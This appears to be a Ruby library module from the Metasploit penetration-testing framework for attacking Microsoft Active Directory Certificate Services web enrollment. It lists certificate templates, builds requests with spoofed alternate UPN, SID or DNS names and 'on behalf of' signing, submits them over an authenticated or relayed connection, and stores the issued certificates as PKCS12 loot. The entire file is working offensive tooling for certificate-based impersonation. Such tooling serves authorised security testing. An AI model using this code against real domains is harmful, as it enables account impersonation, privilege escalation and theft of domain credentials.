module Msf
  class Exploit
    class Remote
      module HTTP
        # This module provides a way of interacting with the Microsoft AD/CS web enrollment portal
        module WebEnrollment
          include Msf::Exploit::Remote::MsIcpr
          def initialize(info = {})
            super
            deregister_options('CA', 'CERT_TEMPLATE', 'ADD_CERT_APP_POLICY', 'RPORT', 'SMBDomain', 'SMBPassword', 'HttpUsername', 'HttpPassword')
            register_options([
                               Opt::RPORT(80),
                               OptString.new('HttpUsername', [false, 'The HTTP username to specify for authentication', '']),
                               OptString.new('HttpPassword', [false, 'The HTTP password to specify for authentication', ''])
                             ])
            register_advanced_options([
                                        OptEnum.new('DigestAlgorithm', [ true, 'The digest algorithm to use', 'SHA256', %w[SHA1 SHA256] ])
                                      ])
          end
          def create_csr(private_key, cert_template)
            vprint_status('Generating CSR...')
            csr = build_csr(
              cn: cert_template,
              private_key: private_key,
              dns: datastore['ALT_DNS'].blank? ? nil : datastore['ALT_DNS'],
              msext_sid: datastore['ALT_SID'].blank? ? nil : datastore['ALT_SID'],
              msext_upn: datastore['ALT_UPN'].blank? ? nil : datastore['ALT_UPN'],
              algorithm: datastore['DigestAlgorithm'],
              application_policies: datastore['ADD_CERT_APP_POLICY']
            )
            #vprint_status("CSR:\n#{csr.to_s}")
            vprint_status('CSR Generated')
            on_behalf_of = datastore['ON_BEHALF_OF'].blank? ? nil : datastore['ON_BEHALF_OF']
            if @pkcs12 && on_behalf_of
              vprint_status("Building certificate request on behalf of #{on_behalf_of}")
              csr = build_on_behalf_of(
                csr: csr,
                on_behalf_of: on_behalf_of,
                cert: @pkcs12.certificate,
                key: @pkcs12.key,
                algorithm: datastore['DigestAlgorithm']
              )
            end
            #
            # vprint_status("CSR on_behalf_of.to_der:\n#{Rex::Text.encode_base64(csr.to_der.to_s)}")

            Rex::Text.encode_base64(csr.to_der.to_s)
          end

          def get_cert_templates(authenticated_client)
            print_status('Retrieving available template list, this may take a few minutes')
            res = send_request_raw(
              {
                'client' => authenticated_client,
                'method' => 'GET',
                'uri' => normalize_uri(target_uri, 'certrqxt.asp')
              }
            )
            return nil unless res&.code == 200

            cert_templates = res.body.scan(/^.*Option Value="[E|O];(.*?);/).map(&:first)
            print_bad('Found no available certificate templates') if cert_templates.empty?
            cert_templates
          end

          def add_cert_entry(connection_identity, cert_template)
            if @issued_certs.key?(connection_identity)
              @issued_certs[connection_identity] << cert_template
            else
              @issued_certs[connection_identity] = [ cert_template ]
            end
          end

          def retrieve_certs(target_ip, authenticated_client, connection_identity, cert_templates)
            cert_templates.each do |cert_template|
              retrieve_cert(target_ip, authenticated_client, connection_identity, cert_template)
            end
          end

          def cert_issued?(connection_identity, cert_template)
            !!@issued_certs[connection_identity]&.include?(cert_template)
          end

          def retrieve_cert(target_ip, authenticated_connection, connection_identity, cert_template)
            if cert_issued?(connection_identity, cert_template)
              print_status("Certificate already created for #{connection_identity} using #{cert_template}, skipping...")
              return nil
            end

            vprint_status("Creating certificate request for #{connection_identity} using the #{cert_template} template")
            private_key = OpenSSL::PKey::RSA.new(4096)
            request = create_csr(private_key, cert_template)
            cert_template_string = "CertificateTemplate:#{cert_template}"
            vprint_status('Requesting relay target generate certificate...')
            res = send_request_raw(
              {
                'client' => authenticated_connection,
                'method' => 'POST',
                'uri' => normalize_uri(datastore['TARGETURI'], 'certfnsh.asp'),
                'ctype' => 'application/x-www-form-urlencoded',
                'vars_post' => {
                  'Mode' => 'newreq',
                  'CertRequest' => request.to_s,
                  'CertAttrib' => cert_template_string,
                  'TargetStoreFlags' => 0,
                  'SaveCert' => 'yes',
                  'ThumbPrint' => ''
                },
                'cgi' => true
              }
            )
            #print_status(res.code.to_s)
            #print_status(res.body.to_s)
            if res&.code == 200 && res.body.include?('request was denied')
              print_bad("Certificate request denied using template #{cert_template} and #{connection_identity}")
              return nil
            end
            if res&.code == 200 && res.body.include?('request failed')
              print_bad("Certificate request failed using template #{cert_template} and #{connection_identity}")
              return nil
            end
            print_good("Certificate generated using template #{cert_template} and #{connection_identity}")
            add_cert_entry(connection_identity, cert_template)

            location_tag = res.body.match(/^.*location="(.*)"/)[1]
            location_uri = normalize_uri(target_uri, location_tag)
            vprint_status("Attempting to download the certificate from #{location_uri}")
            res = send_request_raw(
              {
                'client' => authenticated_connection,
                'method' => 'GET',
                'uri' => location_uri
              }
            )
            info = "#{connection_identity} Certificate"
            certificate = OpenSSL::X509::Certificate.new(res.body)
            pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
            stored_path = store_loot('windows.ad.cs',
                                     'application/x-pkcs12',
                                     target_ip,
                                     pkcs12.to_der,
                                     'certificate.pfx',
                                     info)
            print_good("Certificate for #{connection_identity} using template #{cert_template} saved to #{stored_path}")
            #vprint_status(certificate.to_s)
            certificate
          end
        end
      end
    end
  end
end
